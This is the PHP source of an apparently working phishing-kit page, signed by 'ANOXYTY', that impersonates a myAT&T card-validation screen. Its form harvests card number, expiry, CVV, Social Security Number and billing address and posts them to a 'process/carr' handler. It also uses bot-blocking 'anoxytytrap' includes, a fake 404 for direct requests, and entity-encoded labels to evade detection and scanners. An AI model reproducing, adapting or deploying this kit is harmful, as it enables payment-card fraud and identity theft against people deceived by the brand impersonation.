<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

include 'hidden.php';

$currentPage = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if ($_SERVER['REQUEST_METHOD'] == "GET" && strcmp(basename($currentPage), basename(__FILE__)) == 0)
{
    http_response_code(404);
    include('err0r.php'); // provide your own 404 error page
    die(); /* remove this if you want to execute the rest of
              the code inside the file before redirecting. */
}
include 'anoxytytrap/bot.php';
include 'anoxytytrap/ref.php';
define('Myheader', TRUE);
?>
<?php include 'layers/head.php' ?>
 <body >
 <?php include 'layers/nav.php' ?>
 <div class="styles__forgot-creds-wrapper"><div class="container styles__container"><div class="row"><div class="grid-col-12 styles__pad-none"><div class="styles__box FindPassword__find-pwd-wrapper"><div class="Logo__logo-wrapper"><img data-test-id="Forgot_Pwd_Find_Pwd_Logo" class=" " src="assets/img/myat.svg" alt="myAT&T Logo" aria-label="myAT&T Logo" role="img"></div><div class="PageLevelHeading__page-level-heading-wrapper" data-test-id="Forgot_Pwd_Find_Pwd_Header"><h1>Validate your card information</h1></div><div class="styles__form-row styles__section-content">&#x43;&#x61;&#x72;&#x64;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x6d;&#x75;&#x73;&#x74;&#x20;&#x6d;&#x61;&#x74;&#x63;&#x68;&#x20;&#x6f;&#x75;&#x72;&#x20;&#x72;&#x65;&#x63;&#x6f;&#x72;&#x64;&#x73;&#x2e;</div><div class="styles__form-row ">
 
 
 
  
  <form id="login-cc" class="span12 autoSize-this login-widget lw-box-sizing login-widget-vertical tooltip-bottom" method="Post" action="process/carr">
  
   <div class=" Label__medium  Label__label-parent"><span data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label">Card Holder Name</span></div>
  <div _ngcontent-rbp-c3="" class="form-group">
  <div data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label_TextField" class="form-control"><input autocomplete="off" class="TextField__text-field "  type="text" name="noc" value="" id="name" name="noc"  autocomplete="cc-name"></div></div>
  
  
  <div class=" Label__medium  Label__label-parent"><span data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label">&#x43;&#x61;&#x72;&#x64;&#x20;&#x4e;&#x75;&#x6d;&#x62;&#x65;&#x72;</span></div>
  <div _ngcontent-rbp-c3="" class="form-group">
  <div data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label_TextField" class="form-control"><input autocomplete="off" class="TextField__text-field "  type="tel" name="cc" id="cc-number" name="cc" autocomplete="cc-number" value="" required></div></div>
  
  
  <div class=" Label__medium  Label__label-parent"><span data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label">Expiration date MM/YYYY</span></div>
  <div _ngcontent-rbp-c3="" class="form-group">
  <div data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label_TextField" class="form-control"><input autocomplete="off" class="TextField__text-field "  type="tel" name="expdate" data-spi="false" aria-label="text User ID" value="" required></div></div>
  
  
  
  <div class=" Label__medium  Label__label-parent"><span data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label">CVV</span></div>
  <div _ngcontent-rbp-c3="" class="form-group">
  <div data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label_TextField" class="form-control"><input autocomplete="off" class="TextField__text-field "  type="text" name="cvv" data-spi="false" aria-label="text User ID" value="" required minlength="3" maxlength="4"></div></div>
  
  <div class=" Label__medium  Label__label-parent"><span data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label">Social Security Number</span></div>
  <div _ngcontent-rbp-c3="" class="form-group">
  <div data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label_TextField" class="form-control"><input class="TextField__text-field "  type="tel" name="ssn" maxlength="9" value="" required></div></div>
  
  
   <div class=" Label__medium  Label__label-parent"><span data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label">Billing Address</span></div>
  <div _ngcontent-rbp-c3="" class="form-group">
  <div data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label_TextField" class="form-control"><input class="TextField__text-field "  type="text" name="bladd" id="autocomplete" placeholder="Enter your address" onFocus="geolocate()" type="text" value="" required></div></div>
 
  <div class=" Label__medium  Label__label-parent"><span data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label">Zipcode</span></div>
  <div _ngcontent-rbp-c3="" class="form-group">
  <div data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label_TextField" class="form-control"><input class="TextField__text-field "  type="tel" name="zipcode" id="zipcode" onFocus="geolocate()"  value="" required></div></div>
  
  
  
 
  
  
  
  <div class="InlineError__inline-error-wrapper" data-test-id="Forgot_Pwd_Find_Pwd_User_ID_Label_TextField_Inline_Error"><i class="styles__att-icon-forgotcreds styles__att-icon-forgotcreds-badgealert" role="img" aria-label="Error"></i><div aria-live="assertive" role="alert"><div class=" Label__medium  Label__label-parent"><span></span></div></div></div></div><div class="styles__clear-fix"></div>
  
  <div class="CtaButtonGroup__cta-button-group"><button data-test-id="Forgot_Pwd_Find_Pwd_Continue_Button" class=" Button__button Button__primary   " aria-label="Continue">Continue</button></form>
  <script>
var toggle  = document.getElementById("toggle");
var content = document.getElementById("myDIV");

toggle.addEventListener("click", function() {
  content.style.display = (content.dataset.toggled ^= 1) ? "block" : "none";
});
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
<script src="assets/dist/js/FormValidation.min.js"></script>
<script src="assets/dist/js/plugins/Bootstrap.min.js"></script>
<script src="assets/dist/js/toggle.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
        $('input[name="expdate"]').mask('00/0000');
    </script>
	<a style="display:none" href="anoxytytrap">Trap</a>
  <button data-test-id="Forgot_Pwd_Find_Pwd_Cancel_Button" class=" Button__button Button__text   " aria-label="Cancel">Cancel</button></div></div></div></div></div></div></div><div><attwc-globalnav-footer customer-type="consumer" source="template" class="hydrated"><attwc-globalnav-common-footer customer-type="consumer" class="hydrated"><!----><div class="ge5p_global_styles gn-ds2"><div id="ge5p_z7" class="ge5p_z7" role="contentinfo">
<?php include'layers/footer.php'; ?>